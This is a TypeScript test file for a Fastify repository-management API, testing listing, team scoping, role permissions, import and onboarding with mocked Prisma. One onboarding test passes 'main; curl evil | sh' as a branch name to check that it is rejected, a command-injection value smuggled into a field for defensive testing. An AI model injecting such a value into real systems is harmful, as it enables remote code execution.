// Import the real schema from the subpath so it is not intercepted by the
// barrel mock below (the subpath has no PrismaClient dependency).

import * as connectionCredential from '@auto-swe/shared/lib/connectionCredential';
import { ConnectionTypeSchema } from '@auto-swe/shared/lib/connectionTypes';
import Fastify from 'fastify';
import { serializerCompiler, validatorCompiler } from 'fastify-type-provider-zod';
import { afterAll, beforeAll, beforeEach, describe, expect, it, vi } from 'vitest';

// repositories.ts only uses `DB_NULL` and connection token helpers at
// runtime; mocking the barrel avoids instantiating the real PrismaClient
// singleton (which requires DATABASE_URL at import) — same pattern as
// humanSteps.test.ts / slack.test.ts.
const DB_NULL = vi.hoisted(() => ({ __sentinel: 'DB_NULL' }));
vi.mock('@auto-swe/shared', () => ({
  ConnectionTypeSchema,
  encryptConnectionApiToken: (token: string) => ({
    apiKeyAuthTag: Buffer.from('auth-tag'),
    apiKeyCiphertext: Buffer.from(`cipher-${token}`),
    apiKeyNonce: Buffer.from('nonce'),
    apiKeyVersion: 1,
  }),
  encryptSecret: (value: string) => ({
    authTag: Buffer.from('auth-tag'),
    ciphertext: Buffer.from(`sealed-${value.length}`),
    keyVersion: 1,
    lastFour: value.slice(-4),
    nonce: Buffer.from('nonce'),
  }),
  Prisma: {
    DbNull: DB_NULL,
    sql: (strings: TemplateStringsArray, ...values: unknown[]) => ({
      strings: [...strings],
      values,
    }),
  },
  Role: { ADMIN: 'ADMIN', ENGINEER: 'ENGINEER', LEAD: 'LEAD' },
}));

// URL normalisation compares overrides with the instance's own GitHub hosts;
// stub the config read so it never reaches the database.
const instance = vi.hoisted(() => ({
  apiUrl: 'https://api.github.com',
  baseUrl: 'https://github.com',
}));
vi.mock('../lib/github.js', () => ({
  listGitHubRepos: vi.fn(async () => []),
}));
vi.mock('@auto-swe/shared/lib/systemConfig', () => ({
  resolveGitHubConfig: async () => ({ ...instance }),
}));

// The caller's own GitHub access, asked before a non-admin onboards. Defaults
// to a linked login with read access; the onboarding-access tests override it.
const github = vi.hoisted(() => ({
  lookupRepoPermission: vi.fn(),
  verifiedGithubLoginFor: vi.fn(),
}));
vi.mock('@auto-swe/shared/lib/repoPermission', () => ({
  lookupRepoPermission: (...a: unknown[]) => github.lookupRepoPermission(...a),
  verifiedGithubLoginFor: (...a: unknown[]) => github.verifiedGithubLoginFor(...a),
}));

// The owner-cap read has its own tests; here only which repositories it is asked about matters.
const budgets = vi.hoisted(() => ({ ownerLaunchBudgets: vi.fn() }));
vi.mock('../lib/teamBudgetStatus.js', () => ({
  ownerLaunchBudgets: (...a: unknown[]) => budgets.ownerLaunchBudgets(...a),
}));

import '../test/warmAuthImports.js';
import * as githubImport from '../lib/githubImport.js';
import { resetSweepDebounceForTests } from '../lib/prEvaluationSweep.js';
import { manageableOrReachableConnections, repositoryManagementTeams } from '../lib/tenantScope.js';
import { canManageTeamRepos, repositoryRoutes } from './repositories.js';

interface AuthState {
  role: 'ADMIN' | 'LEAD' | 'ENGINEER';
  sub: string;
}

async function buildApp() {
  const app = Fastify();
  app.setValidatorCompiler(validatorCompiler);
  app.setSerializerCompiler(serializerCompiler);

  const authState: AuthState = { role: 'ADMIN', sub: 'admin-1' };

  const mockPrisma = {
    $transaction: vi.fn(async (fn: ((tx: unknown) => unknown) | Promise<unknown>[]) =>
      Array.isArray(fn)
        ? Promise.all(fn)
        : fn({
            $queryRaw: vi.fn(),
            connection: { update: (...args: unknown[]) => mockPrisma.connection.update(...args) },
            connectionTeamShare: { deleteMany: vi.fn() },
            evalDataset: {
              findUnique: (...args: unknown[]) => mockPrisma.evalDataset.findUnique(...args),
              update: (...args: unknown[]) => mockPrisma.evalDataset.update(...args),
            },
            knowledgeItem: {
              count: (...args: unknown[]) => mockPrisma.knowledgeItem.count(...args),
            },
            team: { findUnique: (...args: unknown[]) => mockPrisma.team.findUnique(...args) },
          })
    ),
    account: { findMany: vi.fn().mockResolvedValue([]) },
    configAuditLog: { create: vi.fn().mockResolvedValue({}) },
    connection: {
      count: vi.fn(),
      create: vi.fn(),
      findFirst: vi.fn(),
      findMany: vi.fn(),
      findUnique: vi.fn(),
      findUniqueOrThrow: vi.fn(),
      update: vi.fn(),
    },
    connectionTeamShare: { deleteMany: vi.fn() },
    evalDataset: { findMany: vi.fn(), findUnique: vi.fn(), update: vi.fn() },
    gitHubInstallation: { findMany: vi.fn().mockResolvedValue([]), findUnique: vi.fn() },
    knowledgeItem: { count: vi.fn().mockResolvedValue(0) },
    organizationMembership: {
      findUnique: vi.fn(),
    },
    prEvaluation: { findMany: vi.fn() },
    repoSetupBlocker: { findMany: vi.fn(), updateMany: vi.fn() },
    repoSetupSecret: {
      count: vi.fn(),
      create: vi.fn(),
      deleteMany: vi.fn(),
      findMany: vi.fn(),
      findUnique: vi.fn(),
      upsert: vi.fn(),
    },
    team: {
      findFirst: vi.fn(),
      findUnique: vi.fn(),
    },
    teamMembership: {
      findMany: vi.fn(),
      findUnique: vi.fn(),
    },
    user: { findUnique: vi.fn().mockResolvedValue(null) },
  };

  const mockAuth = {
    verifyAccessToken: () => ({
      exp: 9999999999,
      iat: 0,
      role: authState.role,
      sub: authState.sub,
    }),
  };

  const mockTemporal = {
    getRepoSetupFileProposalStatus: vi.fn(),
    probeExecutorImage: vi.fn(),
    startPrEvaluationWorkflow: vi.fn(),
    startRepoDependencyScan: vi.fn().mockResolvedValue(undefined),
    startRepoSetupFileProposal: vi.fn(),
  };

  app.decorate('prisma', mockPrisma as unknown as never);
  app.decorate('auth', mockAuth as unknown as never);
  app.decorate('temporal', mockTemporal as unknown as never);

  await app.register(repositoryRoutes, { prefix: '/api/v1/repositories' });
  await app.ready();

  return { app, authState, mockPrisma, mockTemporal };
}

const AUTH_HEADER = { authorization: 'Bearer fake-jwt' };
const TEAM_ID = '22222222-2222-4222-8222-222222222222';
const LISTED_TEAM = { id: TEAM_ID, name: 'Alpha', orgId: 'org-1', slug: 'alpha' };
const REPO_ID = '33333333-3333-4333-8333-333333333333';

function p2002(target: string[]) {
  return Object.assign(new Error('Unique constraint failed'), {
    code: 'P2002',
    meta: { target },
  });
}

describe('repositoryRoutes', () => {
  let ctx: Awaited<ReturnType<typeof buildApp>>;

  beforeAll(async () => {
    ctx = await buildApp();
  });
  afterAll(() => ctx.app.close());
  beforeEach(() => {
    githubImport.clearGitHubImportCaches();
    ctx.authState.role = 'ADMIN';
    ctx.authState.sub = 'admin-1';
    ctx.mockPrisma.$transaction.mockClear();
    ctx.mockTemporal.startRepoDependencyScan.mockReset().mockResolvedValue(undefined);
    ctx.mockPrisma.knowledgeItem.count.mockReset().mockResolvedValue(0);
    ctx.mockPrisma.connectionTeamShare.deleteMany.mockReset();
    ctx.mockPrisma.connection.count.mockReset();
    ctx.mockPrisma.connection.create.mockReset();
    ctx.mockPrisma.connection.findFirst.mockReset();
    ctx.mockPrisma.connection.findMany.mockReset();
    ctx.mockPrisma.connection.findUnique.mockReset();
    ctx.mockPrisma.connection.update.mockReset();
    ctx.mockPrisma.team.findUnique.mockReset();
    ctx.mockPrisma.team.findFirst.mockReset();
    ctx.mockPrisma.teamMembership.findUnique.mockReset();
    ctx.mockPrisma.teamMembership.findMany.mockReset().mockResolvedValue([]);
    ctx.mockPrisma.organizationMembership.findUnique.mockReset();
    budgets.ownerLaunchBudgets.mockReset().mockResolvedValue(new Map());
    ctx.mockPrisma.configAuditLog.create.mockClear();
    ctx.mockPrisma.prEvaluation.findMany.mockReset().mockResolvedValue([]);
    ctx.mockTemporal.startPrEvaluationWorkflow.mockReset().mockResolvedValue(undefined);
    resetSweepDebounceForTests();
    github.verifiedGithubLoginFor.mockReset().mockResolvedValue('octocat');
    github.lookupRepoPermission.mockReset().mockResolvedValue({ ok: true, permission: 'read' });
  });

  describe('repository management roles', () => {
    it.each([
      ['LEAD', 'ORG_MEMBER', true, true],
      ['ENGINEER', 'ORG_ADMIN', true, true],
      ['ENGINEER', 'ORG_MEMBER', true, false],
      ['LEAD', 'ORG_ADMIN', false, false],
    ] as const)(
      'checks team role %s, org role %s, active %s',
      async (teamRole, orgRole, active, allowed) => {
        ctx.mockPrisma.teamMembership.findUnique.mockResolvedValue({
          role: teamRole,
          team: { isActive: active },
        });
        ctx.mockPrisma.team.findUnique.mockResolvedValue({ isActive: active, orgId: 'org-1' });
        ctx.mockPrisma.organizationMembership.findUnique.mockImplementation(async ({ where }) =>
          where.userId_orgId.orgId === 'org-1' ? { role: orgRole } : null
        );
        expect(
          await canManageTeamRepos(ctx.app.prisma, { role: 'ENGINEER', sub: 'user-1' }, TEAM_ID)
        ).toBe(allowed);
        ctx.mockPrisma.teamMembership.findUnique.mockResolvedValue(null);
        ctx.mockPrisma.team.findUnique.mockResolvedValue({ isActive: true, orgId: 'other-org' });
        expect(
          await canManageTeamRepos(ctx.app.prisma, { role: 'ENGINEER', sub: 'user-1' }, TEAM_ID)
        ).toBe(false);
      }
    );

    it.each([true, false])(
      'requires at least one manageable active team for GitHub discovery: %s',
      async (allowed) => {
        ctx.authState.role = 'ENGINEER';
        ctx.mockPrisma.team.findFirst.mockResolvedValue(allowed ? { id: TEAM_ID } : null);
        ctx.mockPrisma.connection.findMany.mockResolvedValue([]);
        const res = await ctx.app.inject({
          headers: AUTH_HEADER,
          method: 'GET',
          url: '/api/v1/repositories/github/available',
        });
        expect(res.statusCode).toBe(allowed ? 200 : 403);
        expect(ctx.mockPrisma.team.findFirst.mock.calls[0][0].where).toEqual(
          repositoryManagementTeams(ctx.authState)
        );
      }
    );
  });

  describe('GET /api/v1/repositories', () => {
    it('returns a paginated list with meta.total/limit/offset', async () => {
      ctx.mockPrisma.connection.findMany.mockResolvedValueOnce([
        { id: 'repo-1', repoName: 'alpha', team: LISTED_TEAM, teamId: TEAM_ID },
        { id: 'repo-2', repoName: 'beta', team: LISTED_TEAM, teamId: TEAM_ID },
      ]);
      ctx.mockPrisma.connection.count.mockResolvedValueOnce(2);

      const res = await ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'GET',
        url: '/api/v1/repositories',
      });

      expect(res.statusCode).toBe(200);
      const body = JSON.parse(res.payload);
      expect(body.data).toHaveLength(2);
      // Defaults from paginationQuery({ defaultLimit: 200, maxLimit: 500 }).
      expect(body.meta).toEqual({ limit: 200, offset: 0, total: 2 });
    });

    describe('launchBudget', () => {
      const status = {
        alertThresholdPercent: null,
        percentUsed: 100,
        scope: 'team',
        state: 'over',
      };
      const row = (
        id: string,
        team: string,
        shares: Array<{ canLaunch: boolean; team: string }>
      ) => ({
        id,
        repoName: id,
        shares: shares.map((s) => ({
          canLaunch: s.canLaunch,
          team: { id: s.team, name: s.team, slug: s.team },
        })),
        team: { id: team, name: team, orgId: `org-${team}`, slug: team },
        type: 'git_repo',
      });

      it("gives a launchable shared repository its owning team's status, one read for the page", async () => {
        ctx.authState.role = 'ENGINEER';
        ctx.authState.sub = 'eng-1';
        ctx.mockPrisma.teamMembership.findMany.mockResolvedValue([{ teamId: 'mine' }]);
        ctx.mockPrisma.connection.findMany.mockResolvedValueOnce([
          row('owned', 'mine', []),
          row('shared', 'owner', [{ canLaunch: true, team: 'mine' }]),
          row('viewonly', 'other', [{ canLaunch: false, team: 'mine' }]),
        ]);
        ctx.mockPrisma.connection.count.mockResolvedValueOnce(3);
        budgets.ownerLaunchBudgets.mockResolvedValue(new Map([['shared', status]]));

        const res = await ctx.app.inject({
          headers: AUTH_HEADER,
          method: 'GET',
          url: '/api/v1/repositories',
        });

        expect(res.statusCode).toBe(200);
        expect(budgets.ownerLaunchBudgets).toHaveBeenCalledTimes(1);
        const asked = budgets.ownerLaunchBudgets.mock.calls[0]?.[1] as Array<{ id: string }>;
        expect(asked.map((r) => r.id)).toEqual(['owned', 'shared']);
        const byId = new Map(
          (JSON.parse(res.payload).data as Array<{ id: string; launchBudget: unknown }>).map(
            (r) => [r.id, r]
          )
        );
        expect(byId.get('shared')?.launchBudget).toEqual(status);
        expect(byId.get('owned')?.launchBudget).toBeNull();
        // View-only: the caller cannot launch there, so no cap is attached.
        expect(byId.get('viewonly')?.launchBudget).toBeNull();
        expect(res.payload).not.toMatch(/usd|cents|orgId/i);
      });
    });

    it('passes executorImageBuild through on list rows', async () => {
      ctx.mockPrisma.connection.findMany.mockResolvedValueOnce([
        {
          executorImageBuild: { stack: 'node', useRepoDockerfile: true },
          id: 'repo-1',
          previewConfig: {
            baseUrl: 'http://localhost:3000',
            readyTimeoutMs: 180_000,
            readyUrl: 'http://localhost:3000/health',
            start: 'npm run dev',
          },
          repoName: 'alpha',
          team: LISTED_TEAM,
          teamId: TEAM_ID,
        },
      ]);
      ctx.mockPrisma.connection.count.mockResolvedValueOnce(1);

      const res = await ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'GET',
        url: '/api/v1/repositories',
      });

      expect(res.statusCode).toBe(200);
      expect(JSON.parse(res.payload).data[0].executorImageBuild).toEqual({
        stack: 'node',
        useRepoDockerfile: true,
      });
      expect(JSON.parse(res.payload).data[0].previewConfig).toMatchObject({
        baseUrl: 'http://localhost:3000',
        readyUrl: 'http://localhost:3000/health',
      });
    });

    describe('teamId filter', () => {
      const scope = { OR: [{ teamId: TEAM_ID }, { shares: { some: { teamId: TEAM_ID } } }] };
      const list = () =>
        ctx.app.inject({
          headers: AUTH_HEADER,
          method: 'GET',
          url: `/api/v1/repositories?teamId=${TEAM_ID}`,
        });

      it('puts the team scope in its own AND element beside reachability, so it only narrows', async () => {
        ctx.authState.role = 'ENGINEER';
        ctx.authState.sub = 'eng-1';
        ctx.mockPrisma.team.findFirst.mockResolvedValue({ id: TEAM_ID });
        ctx.mockPrisma.connection.findMany.mockResolvedValueOnce([]);
        ctx.mockPrisma.connection.count.mockResolvedValueOnce(0);

        const res = await list();

        expect(res.statusCode).toBe(200);
        const { where } = ctx.mockPrisma.connection.findMany.mock.calls[0][0];
        expect(where.AND).toHaveLength(2);
        // The first element is the reachability/active term; the team term is the last, alone.
        expect(where.AND[0].isActive).toBe(true);
        expect(where.AND[0].AND).toHaveLength(2);
        expect(where.AND[1]).toEqual(scope);
        expect(ctx.mockPrisma.connection.count.mock.calls[0][0].where).toEqual(where);
      });

      it('answers 404 TEAM_NOT_FOUND for a non-member and reads no repositories', async () => {
        ctx.authState.role = 'ENGINEER';
        ctx.authState.sub = 'eng-1';
        ctx.mockPrisma.team.findFirst.mockResolvedValue(null);

        const res = await list();

        expect(res.statusCode).toBe(404);
        expect(JSON.parse(res.payload).code ?? JSON.parse(res.payload).error?.code).toBe(
          'TEAM_NOT_FOUND'
        );
        expect(ctx.mockPrisma.connection.findMany).not.toHaveBeenCalled();
      });

      it('lets a platform ADMIN name any team without a membership lookup', async () => {
        ctx.mockPrisma.connection.findMany.mockResolvedValueOnce([]);
        ctx.mockPrisma.connection.count.mockResolvedValueOnce(0);

        const res = await list();

        expect(res.statusCode).toBe(200);
        expect(ctx.mockPrisma.team.findFirst).not.toHaveBeenCalled();
        expect(ctx.mockPrisma.connection.findMany.mock.calls[0][0].where).toEqual({
          AND: [{ isActive: true }, scope],
        });
      });
    });

    it('honors explicit limit/offset query params', async () => {
      ctx.mockPrisma.connection.findMany.mockResolvedValueOnce([]);
      ctx.mockPrisma.connection.count.mockResolvedValueOnce(50);

      const res = await ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'GET',
        url: '/api/v1/repositories?limit=10&offset=20',
      });

      expect(res.statusCode).toBe(200);
      expect(JSON.parse(res.payload).meta).toEqual({ limit: 10, offset: 20, total: 50 });
      const findManyArgs = ctx.mockPrisma.connection.findMany.mock.calls.at(-1)?.[0];
      expect(findManyArgs).toMatchObject({ skip: 20, take: 10 });
    });

    it('narrows the list with q, keeping the access filter', async () => {
      ctx.mockPrisma.connection.findMany.mockResolvedValueOnce([]);
      ctx.mockPrisma.connection.count.mockResolvedValueOnce(0);

      const res = await ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'GET',
        url: '/api/v1/repositories?q=pay',
      });

      expect(res.statusCode).toBe(200);
      const where = ctx.mockPrisma.connection.findMany.mock.calls.at(-1)?.[0].where;
      expect(where.AND[0]).toEqual({ isActive: true });
      expect(where.AND[1].OR).toContainEqual({
        repoName: { contains: 'pay', mode: 'insensitive' },
      });
      expect(ctx.mockPrisma.connection.count.mock.calls.at(-1)?.[0].where).toEqual(where);
    });

    it('does not scope the where clause to a team for an ADMIN', async () => {
      ctx.mockPrisma.connection.findMany.mockResolvedValueOnce([]);
      ctx.mockPrisma.connection.count.mockResolvedValueOnce(0);

      await ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'GET',
        url: '/api/v1/repositories',
      });

      const findManyArgs = ctx.mockPrisma.connection.findMany.mock.calls.at(-1)?.[0];
      expect(findManyArgs.where).toEqual({ isActive: true });
      const countArgs = ctx.mockPrisma.connection.count.mock.calls.at(-1)?.[0];
      expect(countArgs.where).toEqual({ isActive: true });
    });

    it('scopes the where clause to the caller’s teams for a non-ADMIN', async () => {
      ctx.authState.role = 'ENGINEER';
      ctx.authState.sub = 'engineer-7';
      ctx.mockPrisma.connection.findMany.mockResolvedValueOnce([]);
      ctx.mockPrisma.connection.count.mockResolvedValueOnce(0);

      await ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'GET',
        url: '/api/v1/repositories',
      });

      const findManyArgs = ctx.mockPrisma.connection.findMany.mock.calls.at(-1)?.[0];
      // The caller's own teams, or a team the repository is shared with.
      expect(findManyArgs.where).toEqual({
        ...manageableOrReachableConnections({ sub: 'engineer-7' }, undefined),
        isActive: true,
      });
    });

    it('includes deactivated connections for a LEAD+ caller that asks for them', async () => {
      ctx.mockPrisma.connection.findMany.mockResolvedValueOnce([]);
      ctx.mockPrisma.connection.count.mockResolvedValueOnce(0);

      await ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'GET',
        url: '/api/v1/repositories?includeInactive=true',
      });

      const findManyArgs = ctx.mockPrisma.connection.findMany.mock.calls.at(-1)?.[0];
      expect(findManyArgs.where).toEqual({});
    });

    it('shows a platform LEAD deactivated connections only on teams they lead', async () => {
      ctx.authState.role = 'LEAD';
      ctx.authState.sub = 'lead-3';
      ctx.mockPrisma.connection.findMany.mockResolvedValueOnce([]);
      ctx.mockPrisma.connection.count.mockResolvedValueOnce(0);

      await ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'GET',
        url: '/api/v1/repositories?includeInactive=true',
      });

      const findManyArgs = ctx.mockPrisma.connection.findMany.mock.calls.at(-1)?.[0];
      expect(findManyArgs.where).toEqual({
        AND: [
          // Reachability: their own teams, or a team the repository is shared with.
          manageableOrReachableConnections({ sub: 'lead-3' }, undefined),
          // Active rows on any of those; inactive rows only where they are team
          // LEAD/ADMIN and so could reactivate them.
          {
            OR: [
              { isActive: true },
              {
                team: repositoryManagementTeams({ sub: 'lead-3' }),
              },
            ],
          },
        ],
      });
      expect(ctx.mockPrisma.connection.count.mock.calls.at(-1)?.[0].where).toEqual(
        findManyArgs.where
      );
    });

    it('scopes inactive rows to managed teams regardless of platform role, and treats "false" as false', async () => {
      ctx.authState.role = 'ENGINEER';
      ctx.authState.sub = 'engineer-7';
      ctx.mockPrisma.connection.findMany.mockResolvedValue([]);
      ctx.mockPrisma.connection.count.mockResolvedValue(0);

      await ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'GET',
        url: '/api/v1/repositories?includeInactive=true',
      });
      expect(ctx.mockPrisma.connection.findMany.mock.calls.at(-1)?.[0].where.AND[1]).toEqual({
        OR: [{ isActive: true }, { team: repositoryManagementTeams({ sub: 'engineer-7' }) }],
      });

      ctx.authState.role = 'ADMIN';
      await ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'GET',
        url: '/api/v1/repositories?includeInactive=false',
      });
      expect(ctx.mockPrisma.connection.findMany.mock.calls.at(-1)?.[0].where).toEqual({
        isActive: true,
      });
    });

    it('returns 400 when limit exceeds maxLimit', async () => {
      const res = await ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'GET',
        url: '/api/v1/repositories?limit=501',
      });
      expect(res.statusCode).toBe(400);
      expect(ctx.mockPrisma.connection.findMany).not.toHaveBeenCalled();
    });

    it('returns 400 for a negative offset', async () => {
      const res = await ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'GET',
        url: '/api/v1/repositories?offset=-1',
      });
      expect(res.statusCode).toBe(400);
    });

    it('returns 401 without auth', async () => {
      const res = await ctx.app.inject({
        method: 'GET',
        url: '/api/v1/repositories',
      });
      expect(res.statusCode).toBe(401);
    });
  });

  describe('POST /api/v1/repositories/import', () => {
    const INSTALLATION = '66666666-6666-4666-8666-666666666666';
    const item = (repoName: string, installationId: string | null = null) => ({
      installationId,
      organizationName: 'acme',
      repoName,
    });
    const batch = (repos: ReturnType<typeof item>[]) =>
      ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'POST',
        payload: { repos, teamId: TEAM_ID },
        url: '/api/v1/repositories/import',
      });
    beforeEach(() => {
      ctx.mockPrisma.team.findUnique.mockResolvedValue({ id: TEAM_ID, isActive: true });
      ctx.mockPrisma.connection.create.mockImplementation(async ({ data }) => ({
        ...data,
        id: REPO_ID,
      }));
    });
    it('keeps successes and reports duplicates and denied access independently', async () => {
      ctx.authState.role = 'ENGINEER';
      ctx.mockPrisma.teamMembership.findUnique.mockResolvedValue({
        role: 'LEAD',
        team: { isActive: true },
      });
      github.lookupRepoPermission.mockImplementation(async (r) => ({
        ok: true,
        permission: r.repoName === 'denied' ? 'none' : 'read',
      }));
      ctx.mockPrisma.connection.findFirst.mockImplementation(async ({ where }) =>
        where.repoName.equals === 'duplicate' ? { id: REPO_ID } : null
      );
      const res = await batch([item('first'), item('denied'), item('duplicate'), item('last')]);
      expect(res.statusCode).toBe(200);
      expect(res.json().data).toEqual([
        { id: REPO_ID, organizationName: 'acme', repoName: 'first', status: 'created' },
        expect.objectContaining({ repoName: 'denied', status: 'failed' }),
        expect.objectContaining({ code: 'REPO_EXISTS', repoName: 'duplicate', status: 'failed' }),
        { id: REPO_ID, organizationName: 'acme', repoName: 'last', status: 'created' },
      ]);
      expect(ctx.mockPrisma.connection.create).toHaveBeenCalledTimes(2);
      expect(ctx.mockTemporal.startRepoDependencyScan).toHaveBeenCalledTimes(2);
    });
    it('rejects unknown installations without creating a connection', async () => {
      ctx.mockPrisma.gitHubInstallation.findUnique.mockResolvedValue(null);
      const res = await batch([item('api', INSTALLATION)]);
      expect(res.json().data[0]).toMatchObject({
        code: 'INSTALLATION_REPO_NOT_FOUND',
        status: 'failed',
      });
      expect(ctx.mockPrisma.connection.create).not.toHaveBeenCalled();
    });
    it('authorizes the target team before checking an installation or creating anything', async () => {
      ctx.authState.role = 'ENGINEER';
      ctx.mockPrisma.teamMembership.findUnique.mockResolvedValue(null);
      ctx.mockPrisma.gitHubInstallation.findUnique.mockClear();
      const res = await batch([item('api', INSTALLATION), item('other')]);
      expect(res.json().data.map((r: { code: string }) => r.code)).toEqual([
        'FORBIDDEN',
        'FORBIDDEN',
      ]);
      expect(ctx.mockPrisma.gitHubInstallation.findUnique).not.toHaveBeenCalled();
      expect(ctx.mockPrisma.connection.create).not.toHaveBeenCalled();
    });
    it('fails every item for an inactive target team', async () => {
      ctx.mockPrisma.team.findUnique.mockResolvedValue({ id: TEAM_ID, isActive: false });
      const res = await batch([item('api')]);
      expect(res.json().data[0].code).toBe('TEAM_NOT_FOUND');
    });
    it('allows team leads to attach only server-verified installations with derived host bases', async () => {
      ctx.authState.role = 'ENGINEER';
      ctx.mockPrisma.teamMembership.findUnique.mockResolvedValue({
        role: 'LEAD',
        team: { isActive: true },
      });
      ctx.mockPrisma.gitHubInstallation.findUnique.mockResolvedValue({
        host: 'ghe.corp',
        installationId: '123',
      });
      const verify = vi.spyOn(githubImport, 'verifiedImportInstallation').mockResolvedValue({
        installation: {
          accountLogin: 'acme',
          host: 'ghe.corp',
          id: INSTALLATION,
          installationId: '123',
          isActive: true,
        } as never,
        source: {
          githubApiUrl: 'https://ghe.corp/api/v3',
          githubUrl: 'https://ghe.corp',
          installationAccount: 'acme',
          installationId: INSTALLATION,
        },
      });
      const hosts = vi
        .spyOn(connectionCredential, 'repositoryHostsAllowed')
        .mockResolvedValue({ ok: true });
      try {
        const res = await batch([item('api', INSTALLATION)]);
        expect(res.json().data[0].status).toBe('created');
        expect(ctx.mockPrisma.connection.create.mock.calls[0][0].data).toMatchObject({
          githubApiUrl: 'https://ghe.corp/api/v3',
          githubUrl: 'https://ghe.corp',
          installationId: INSTALLATION,
        });
        expect(github.lookupRepoPermission.mock.calls[0][0]).toMatchObject({
          installation: { host: 'ghe.corp', installationId: '123' },
        });
        expect(verify).toHaveBeenCalledWith(ctx.app.prisma, INSTALLATION, 'acme', 'api');
      } finally {
        verify.mockRestore();
        hosts.mockRestore();
      }
    });
    it('continues after unexpected per-repository errors without exposing their bodies', async () => {
      ctx.mockPrisma.connection.create.mockRejectedValueOnce(new Error('secret database body'));
      const res = await batch([item('failed'), item('good')]);
      expect(res.json().data.map((r: { status: string }) => r.status)).toEqual([
        'failed',
        'created',
      ]);
      expect(res.payload).not.toContain('secret database body');
    });
    it('rejects empty and oversized batches', async () => {
      expect((await batch([])).statusCode).toBe(400);
      expect((await batch(Array.from({ length: 51 }, (_, i) => item(`repo${i}`)))).statusCode).toBe(
        400
      );
      expect(ctx.mockPrisma.connection.create).not.toHaveBeenCalled();
    });
  });

  describe('POST /api/v1/repositories', () => {
    it('rejects a defaultBranch that is not a valid git ref name (400)', async () => {
      const res = await ctx.app.inject({
        body: {
          defaultBranch: 'main; curl evil | sh',
          organizationName: 'acme',
          repoName: 'api',
          teamId: TEAM_ID,
        },
        headers: AUTH_HEADER,
        method: 'POST',
        url: '/api/v1/repositories',
      });
      expect(res.statusCode).toBe(400);
      expect(ctx.mockPrisma.connection.create).not.toHaveBeenCalled();
    });

    it('refuses to create an MCP connection through the repository path (400)', async () => {
      const res = await ctx.app.inject({
        body: { config: { url: 'http://mcp.internal' }, teamId: TEAM_ID, type: 'mcp' },
        headers: AUTH_HEADER,
        method: 'POST',
        url: '/api/v1/repositories',
      });
      expect(res.statusCode).toBe(400);
      expect(ctx.mockPrisma.connection.create).not.toHaveBeenCalled();
    });
    const validBody = {
      organizationName: 'acme',
      repoName: 'widgets',
      teamId: TEAM_ID,
      type: 'git_repo',
    };

    it("clears an override spelling out the instance's host however that host is configured", async () => {
      // `resolveGitHubConfig` is DB-primary with an environment fallback, so a
      // host configured only through the environment resolves the same way.
      Object.assign(instance, { apiUrl: 'https://ghe.corp/api/v3', baseUrl: 'https://ghe.corp' });
      try {
        ctx.mockPrisma.team.findUnique.mockResolvedValueOnce({ id: TEAM_ID, isActive: true });
        ctx.mockPrisma.connection.findFirst.mockResolvedValueOnce(null);
        ctx.mockPrisma.connection.create.mockResolvedValueOnce({ id: REPO_ID, teamId: TEAM_ID });
        const res = await ctx.app.inject({
          headers: AUTH_HEADER,
          method: 'POST',
          payload: {
            ...validBody,
            githubApiUrl: 'https://ghe.corp/api/v3',
            githubUrl: 'https://ghe.corp',
          },
          url: '/api/v1/repositories',
        });
        expect(res.statusCode).toBe(201);
        expect(ctx.mockPrisma.connection.create).toHaveBeenCalledWith(
          expect.objectContaining({
            data: expect.objectContaining({ githubApiUrl: null, githubUrl: null }),
          })
        );
      } finally {
        Object.assign(instance, {
          apiUrl: 'https://api.github.com',
          baseUrl: 'https://github.com',
        });
      }
    });

    it('starts a scan of the new repository, so its stack is detected before its first run', async () => {
      ctx.mockPrisma.team.findUnique.mockResolvedValueOnce({ id: TEAM_ID, isActive: true });
      ctx.mockPrisma.connection.findFirst.mockResolvedValueOnce(null);
      ctx.mockPrisma.connection.create.mockResolvedValueOnce({ id: REPO_ID, teamId: TEAM_ID });
      const res = await ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'POST',
        payload: validBody,
        url: '/api/v1/repositories',
      });
      expect(res.statusCode).toBe(201);
      expect(ctx.mockTemporal.startRepoDependencyScan).toHaveBeenCalledTimes(1);
      expect(ctx.mockTemporal.startRepoDependencyScan).toHaveBeenCalledWith(REPO_ID);
    });

    it('still onboards when the scan cannot be started (the weekly sweep covers it)', async () => {
      ctx.mockTemporal.startRepoDependencyScan.mockRejectedValueOnce(new Error('temporal down'));
      ctx.mockPrisma.team.findUnique.mockResolvedValueOnce({ id: TEAM_ID, isActive: true });
      ctx.mockPrisma.connection.findFirst.mockResolvedValueOnce(null);
      ctx.mockPrisma.connection.create.mockResolvedValueOnce({ id: REPO_ID, teamId: TEAM_ID });
      const res = await ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'POST',
        payload: validBody,
        url: '/api/v1/repositories',
      });
      expect(res.statusCode).toBe(201);
      expect(JSON.parse(res.payload).data.id).toBe(REPO_ID);
    });

    it('starts no scan for a repository that was refused', async () => {
      ctx.mockPrisma.team.findUnique.mockResolvedValueOnce({ id: TEAM_ID, isActive: true });
      ctx.mockPrisma.connection.findFirst.mockResolvedValueOnce({ id: 'existing' });
      const res = await ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'POST',
        payload: validBody,
        url: '/api/v1/repositories',
      });
      expect(res.statusCode).toBe(409);
      expect(ctx.mockTemporal.startRepoDependencyScan).not.toHaveBeenCalled();
    });

    it('onboards a repository and returns 201', async () => {
      ctx.mockPrisma.team.findUnique.mockResolvedValueOnce({ id: TEAM_ID, isActive: true });
      ctx.mockPrisma.connection.findFirst.mockResolvedValueOnce(null);
      ctx.mockPrisma.connection.create.mockResolvedValueOnce({
        id: REPO_ID,
        organizationName: 'acme',
        repoName: 'widgets',
        teamId: TEAM_ID,
      });

      const res = await ctx.app.inject({
        headers: AUTH_HEADER,
        method: 'POST',
        payload: validBody,
        url: '/api/v1/repositories',
      });

      expect(res.statusCode).toBe(201);
